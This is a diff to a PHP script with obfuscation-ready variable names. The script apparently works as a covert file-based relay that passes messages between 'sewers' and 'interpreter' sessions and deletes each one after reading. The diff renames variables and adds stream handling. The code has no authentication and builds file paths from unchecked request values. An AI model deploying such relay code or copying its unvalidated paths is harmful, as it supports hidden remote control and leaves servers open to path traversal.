@@ -2,10 +2,14 @@
 
 // Set variables
 
-	$obf_var_res_dir = "";
-	$obf_var_req_dir = "";
+	$obf_var_requests_dir = "";
+	$obf_var_responses_dir = "";
+	$obf_var_streams_dir = "";
+	$obf_var_stream_requests_dir = "";
+	$obf_var_stream_buffer_dir = "";
 	$obf_var_sewers_post_tag = "";
 	$obf_var_sewers_get_tag = "";
+	$obf_var_sewers_stream_tag = "";
 	$obf_var_interpreter_post_tag = "";
 	$obf_var_interpreter_get_tag = "";
 	$obf_var_packet = file_get_contents("php://input");
@@ -25,7 +29,7 @@
 
 // Set functions
 
-	function obf_func_randString() {
+	function obf_func_randomString() {
 		$obf_var_chars = "abcdefghijklmnopqrstuvwxyz";
 		$obf_var_charsLength = strlen($obf_var_chars);
 		$obf_var_buffer = "";
@@ -54,23 +58,23 @@
 
 // Parse packet
 
-	if ( !is_dir("./" . $obf_var_res_dir) ) {
-		mkdir("./" . $obf_var_res_dir);
+	if ( !is_dir("./" . $obf_var_responses_dir) ) {
+		mkdir("./" . $obf_var_responses_dir);
 	}
 
-	if ( !is_dir("./" . $obf_var_req_dir) ) {
-		mkdir("./" . $obf_var_req_dir);
+	if ( !is_dir("./" . $obf_var_requests_dir) ) {
+		mkdir("./" . $obf_var_requests_dir);
 	}
 
 	// Sewers GET request
 	if ( $obf_var_req_type == $obf_var_sewers_get_tag && $obf_var_session_id != "" ) {
-		if ( is_dir("./" . $obf_var_res_dir . "/" . $obf_var_session_id) ) {
+		if ( is_dir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id) ) {
 			if ($obf_var_body == "") {
-				echo join( ",", obf_func_scanDir("./" . $obf_var_res_dir . "/" . $obf_var_session_id) );
+				echo join( ",", obf_func_scanDir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id) );
 			} else {
-				if ( is_file("./" . $obf_var_res_dir . "/" . $obf_var_session_id . "/" . $obf_var_body) ) {
-					echo file_get_contents("./" . $obf_var_res_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
-					unlink("./" . $obf_var_res_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
+				if ( is_file("./" . $obf_var_responses_dir . "/" . $obf_var_session_id . "/" . $obf_var_body) ) {
+					echo file_get_contents("./" . $obf_var_responses_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
+					unlink("./" . $obf_var_responses_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
 				} else {
 					http_response_code(404);
 					die();
@@ -81,37 +85,48 @@
 			die();
 		}
 	} elseif ( $obf_var_req_type == $obf_var_sewers_get_tag && $obf_var_session_id == "" ) {
-		echo join( ",", obf_func_scanDir("./" . $obf_var_res_dir) );
+		echo join( ",", obf_func_scanDir("./" . $obf_var_responses_dir) );
 	}
 
 	// Sewers POST request
 	if ( $obf_var_req_type == $obf_var_sewers_post_tag && isset($obf_var_session_id) ) {
-		if ( !is_dir("./" . $obf_var_req_dir . "/" . $obf_var_session_id) ) {
-			mkdir("./" . $obf_var_req_dir . "/" . $obf_var_session_id);
+		if ( !is_dir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id) ) {
+			mkdir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id);
 		}
-		obf_func_writeFile("./" . $obf_var_req_dir . "/" . $obf_var_session_id, $obf_var_body);
+		obf_func_writeFile("./" . $obf_var_requests_dir . "/" . $obf_var_session_id, $obf_var_body);
+	}
+
+	// Sewers stream request
+	if ( $obf_var_req_type == $obf_var_sewers_stream_tag && isset($obf_var_session_id) ) {
+		if ( !is_dir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id) ) {
+			mkdir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id);
+		}
+		mkdir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_requests_dir);
+		$obf_var_new_stream_session_id = obf_func_randomString();
+		obf_func_writeFile("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_requests_dir . "/" . $obf_var_new_stream_session_id, $obf_var_body);
+		echo $obf_var_new_stream_session_id;
 	}
 
 	// Interpreter GET request
 	if ($obf_var_req_type == $obf_var_interpreter_get_tag && $obf_var_session_id != "" ) {
-		if ( !is_dir("./" . $obf_var_res_dir . "/" . $obf_var_session_id) ) {
-			mkdir("./" . $obf_var_res_dir . "/" . $obf_var_session_id);
+		if ( !is_dir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id) ) {
+			mkdir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id);
 		}
-		if ( !is_dir("./" . $obf_var_req_dir . "/" . $obf_var_session_id) ) {
-			mkdir("./" . $obf_var_req_dir . "/" . $obf_var_session_id);
+		if ( !is_dir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id) ) {
+			mkdir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id);
 		}
 		if ($obf_var_body == "") {
-			$obf_var_req_dir_entries = obf_func_scanDir("./" . $obf_var_req_dir . "/" . $obf_var_session_id);
-			if ( count($obf_var_req_dir_entries) > 0 ) {
-				echo join(",", $obf_var_req_dir_entries);
+			$obf_var_requests_dir_entries = obf_func_scanDir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id);
+			if ( count($obf_var_requests_dir_entries) > 0 ) {
+				echo join(",", $obf_var_requests_dir_entries);
 			} else {
 				http_response_code(404);
 				die();
 			}
 		} else {
-			if ( is_file("./" . $obf_var_req_dir . "/" . $obf_var_session_id . "/" . $obf_var_body) ) {
-				echo file_get_contents("./" . $obf_var_req_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
-				unlink("./" . $obf_var_req_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
+			if ( is_file("./" . $obf_var_requests_dir . "/" . $obf_var_session_id . "/" . $obf_var_body) ) {
+				echo file_get_contents("./" . $obf_var_requests_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
+				unlink("./" . $obf_var_requests_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
 			} else {
 				http_response_code(404);
 				die();
@@ -121,13 +136,13 @@
 
 	// Interpreter POST request
 	if ($obf_var_req_type == $obf_var_interpreter_post_tag && isset($obf_var_session_id) ) {
-		if ( !is_dir("./" . $obf_var_res_dir . "/" . $obf_var_session_id) ) {
-			mkdir("./" . $obf_var_res_dir . "/" . $obf_var_session_id);
+		if ( !is_dir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id) ) {
+			mkdir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id);
 		}
-		if ( !is_dir("./" . $obf_var_req_dir . "/" . $obf_var_session_id) ) {
-			mkdir("./" . $obf_var_req_dir . "/" . $obf_var_session_id);
+		if ( !is_dir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id) ) {
+			mkdir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id);
 		}
-		obf_func_writeFile("./" . $obf_var_res_dir . "/" . $obf_var_session_id, $obf_var_body);
+		obf_func_writeFile("./" . $obf_var_responses_dir . "/" . $obf_var_session_id, $obf_var_body);
 	}
 
 ?>
